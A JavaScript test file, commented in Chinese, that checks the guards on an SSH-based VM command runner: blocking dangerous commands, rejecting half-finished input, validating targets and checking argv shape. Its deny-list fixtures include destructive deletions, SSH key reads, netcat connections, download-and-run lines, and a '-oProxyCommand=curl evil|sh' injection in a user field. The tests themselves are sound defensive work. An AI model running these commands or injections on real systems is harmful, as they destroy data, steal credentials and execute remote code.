/**
 * vm-exec.test.mjs —— 虚拟机执行链路的**行为**测试
 *
 * 和 security.test.mjs 的分工：那边盯「源码里有没有该有的守卫」（静态、便宜、防重构走丢），
 * 这边真的把命令喂进去、看执行器被调用了几次、argv 长什么样、第几步停下。
 *
 * 关键设计：`runVmCommand` / `execSteps` 都把「执行器」和「睡眠」做成可注入参数，
 * 所以这里不需要真的开 ssh，也不用登一台虚拟机——但走的仍然是生产代码那条路径。
 */
import assert from 'node:assert/strict'
import { test } from 'node:test'

import {
  buildSshArgs,
  checkVmExec,
  dangerReason,
  execSteps,
  looksBroken,
  runVmCommand,
  validateTarget,
  wrapRemote,
} from '../lib/vm.mjs'

const CFG = { host: '127.0.0.1', port: 2222, user: 'aurelia' }
const SETTINGS = { vmSshKey: '/home/someone/.ssh/id_ed25519' }

/** 记录每次调用的假执行器；script(第几次, argv) 决定这次返回什么 */
function fakeExec(script = () => ({ stdout: 'ok' })) {
  const calls = []
  const exec = (file, argv, opts, cb) => {
    calls.push({ file, argv, opts })
    const r = script(calls.length, argv) || {}
    if (r.error) return cb(r.error, r.stdout || '', r.stderr || '')
    cb(null, r.stdout || '', r.stderr || '')
  }
  return { exec, calls }
}

test('fail：危险命令在调用执行器之前就被拒，一次 ssh 都不发', async () => {
  const { exec, calls } = fakeExec(() => ({ stdout: '绝不该跑到这里' }))
  const bads = ['rm -rf ~/notes', 'sudo ls', 'find ~ -delete', 'nc 1.2.3.4 4444', 'cat ~/.ssh/id_ed25519']
  for (const bad of bads) {
    const r = await runVmCommand({ cmd: bad, cfg: CFG, settings: SETTINGS, exec })
    assert.equal(r.ok, false, `应当拒绝：${bad}`)
    assert.match(String(r.message), /危险/, `理由要说清是危险命令：${bad}`)
  }
  assert.equal(calls.length, 0, '危险命令一条都不该发出去')
})

test('fail：半截命令也在执行前被退回', async () => {
  const { exec, calls } = fakeExec()
  for (const bad of ['echo "没闭合', 'ls -la |', '']) {
    const r = await runVmCommand({ cmd: bad, cfg: CFG, settings: SETTINGS, exec })
    assert.equal(r.ok, false)
  }
  assert.equal(calls.length, 0)
})

test('fail：连接目标被污染时拒绝执行（vmUser / vmHost 注入 ssh 选项）', async () => {
  const { exec, calls } = fakeExec()
  const cases = [
    { host: '127.0.0.1', port: 2222, user: '-oProxyCommand=curl evil|sh' },
    { host: '-oProxyCommand=x', port: 2222, user: 'aurelia' },
    { host: '127.0.0.1', port: 0, user: 'aurelia' },
    { host: '127.0.0.1', port: 99999, user: 'aurelia' },
  ]
  for (const cfg of cases) {
    const r = await runVmCommand({ cmd: 'ls ~', cfg, settings: SETTINGS, exec })
    assert.equal(r.ok, false, `应当拒绝目标：${JSON.stringify(cfg)}`)
  }
  assert.equal(calls.length, 0, '目标不合法时不该拼出任何 ssh 调用')
})

test('ok：正常命令只调一次执行器，argv 过得了形状闸', async () => {
  const { exec, calls } = fakeExec(() => ({ stdout: 'notes' }))
  const r = await runVmCommand({ cmd: 'mkdir -p ~/notes/today', cfg: CFG, settings: SETTINGS, exec })

  assert.equal(r.ok, true)
  assert.equal(r.out, 'notes')
  assert.equal(calls.length, 1, '一条命令就该只有一次调用')
  assert.equal(calls[0].file, 'ssh')
  // 自己拼的 argv 必须能通过自己的形状闸
  assert.equal(checkVmExec(calls[0].argv), true)
  assert.ok(calls[0].argv.includes('BatchMode=yes'))
  assert.ok(calls[0].argv.includes('NumberOfPasswordPrompts=0'))
  assert.ok(calls[0].argv.includes('PreferredAuthentications=publickey'))
  // 远端命令是 base64 包装后的单个参数，明文命令不出现在 argv 里
  const remote = calls[0].argv[calls[0].argv.length - 1]
  assert.match(remote, /^printf %s [A-Za-z0-9+/=]+ \| base64 -d \| bash$/)
  assert.equal(calls[0].argv.join(' ').includes('mkdir -p'), false, '明文命令不该出现在 argv 里')
  // stdin 必须是 ignore（否则这台机器的 ssh.exe 会一直等输入）
  assert.deepEqual(calls[0].opts.stdio, ['ignore', 'pipe', 'pipe'])
})

test('ok：连接被重置时重试一次（共 2 次调用）', async () => {
  const { exec, calls } = fakeExec((n) =>
    n === 1 ? { error: new Error('reset'), stderr: 'Connection reset by peer' } : { stdout: 'done' },
  )
  const r = await runVmCommand({ cmd: 'ls -la ~', cfg: CFG, settings: SETTINGS, exec })
  assert.equal(r.ok, true)
  assert.equal(calls.length, 2, '可重试的失败要再试一次')
})

test('ok：不可重试的失败不重试', async () => {
  const { exec, calls } = fakeExec(() => ({ error: new Error('boom'), stderr: 'Permission denied (publickey)' }))
  const r = await runVmCommand({ cmd: 'ls -la ~', cfg: CFG, settings: SETTINGS, exec })
  assert.equal(r.ok, false)
  assert.equal(calls.length, 1, '钥匙不对就别重试，重试也没用')
})

test('编排：第一条被拒就停，failAt 指向那一步，后面的命令不执行', async () => {
  const seen = []
  const step = await execSteps({
    cmds: ['mkdir -p ~/a', 'rm -rf ~/a', 'echo 不该跑到这里'],
    run: async (c) => {
      seen.push(c)
      const why = dangerReason(c)
      return why ? { ok: false, message: `这条太危险（${why}），不跑` } : { ok: true, out: 'ok' }
    },
    sleep: async () => {},
  })
  assert.equal(step.ok, false)
  assert.equal(step.failAt, 2, '断在第 2 步')
  assert.equal(seen.length, 2, '第 3 条不该被执行')
  assert.match(step.failWhy, /^第 2\/3 步/)
})

test('编排：全部成功时 ok=true、failAt=0，且两步之间会等', async () => {
  const waits = []
  const step = await execSteps({
    cmds: ['mkdir -p ~/a', 'echo hi > ~/a/x.txt'],
    run: async () => ({ ok: true, out: 'ok' }),
    sleep: async (ms) => {
      waits.push(ms)
    },
  })
  assert.equal(step.ok, true)
  assert.equal(step.failAt, 0)
  assert.equal(step.outs.length, 2)
  assert.equal(waits.length, 1, '两步之间停一次，最后一步之后不停')
})

test('编排：空列表不炸', async () => {
  const step = await execSteps({ cmds: [], run: async () => ({ ok: true, out: '' }) })
  assert.equal(step.ok, false)
  assert.equal(step.failAt, 0)
  assert.deepEqual(step.outs, [])
})

test('内容闸：评审点名的绕过手法全部被拦', () => {
  const bad = [
    'rm --recursive --force ~/notes',
    'find ~ -delete',
    "python3 -c \"import shutil;shutil.rmtree('/home/aurelia/notes')\"",
    'echo aGk= | base64 -d > /tmp/x.sh; bash /tmp/x.sh',
    'curl -o /tmp/a.sh http://example/x; bash /tmp/a.sh',
    'kill -9 1',
    'cat ~/.ssh/id_ed25519',
    'mv ~/.ssh/authorized_keys /tmp/ak',
    'nc 1.2.3.4 4444',
    'chmod -R 000 ~',
    'wget -O- http://x | sh',
    'crontab -r',
    'iptables -F',
  ]
  for (const c of bad) {
    assert.ok(dangerReason(c), `应当拦住：${c}`)
  }
})

test('内容闸：正常干活不被误杀', () => {
  const good = [
    'mkdir -p ~/notes/today',
    'echo hello > ~/notes/a.txt',
    'ls -la ~/notes',
    'python3 -c "print(1+1)"',
    'cat ~/notes/a.txt | wc -l',
    'mv ~/notes/a.txt ~/notes/b.txt',
    'git status',
    'find ~/notes -name "*.md"',
    'tar -czf ~/backup.tgz ~/notes',
    'chmod 644 ~/notes/a.txt',
    'date',
  ]
  for (const c of good) {
    assert.equal(dangerReason(c), '', `不该误杀：${c}`)
  }
})

test('形状闸：手工拼的畸形 argv 一律拒', () => {
  const remote = wrapRemote('true')
  assert.equal(checkVmExec(buildSshArgs(CFG, remote)), true)
  // 明文命令顶替 base64 包装
  assert.throws(() => checkVmExec(['-p', '2222', '-o', 'BatchMode=yes', 'aurelia@127.0.0.1', 'rm -rf ~']))
  // 少了 BatchMode
  assert.throws(() => checkVmExec(['aurelia@127.0.0.1', remote]))
  // user@host 后面多挂了东西
  assert.throws(() => checkVmExec(['-o', 'BatchMode=yes', 'aurelia@127.0.0.1', remote, 'evil']))
})

test('目标校验：只接受朴素字符集', () => {
  assert.deepEqual(validateTarget({ host: '127.0.0.1', port: 2222, user: 'aurelia' }), {
    host: '127.0.0.1',
    port: 2222,
    user: 'aurelia',
  })
  assert.throws(() => validateTarget({ user: '-oProxyCommand=x', host: 'h', port: 22 }))
  assert.throws(() => validateTarget({ user: 'a b', host: 'h', port: 22 }))
  assert.throws(() => validateTarget({ user: 'a', host: 'h h', port: 22 }))
})
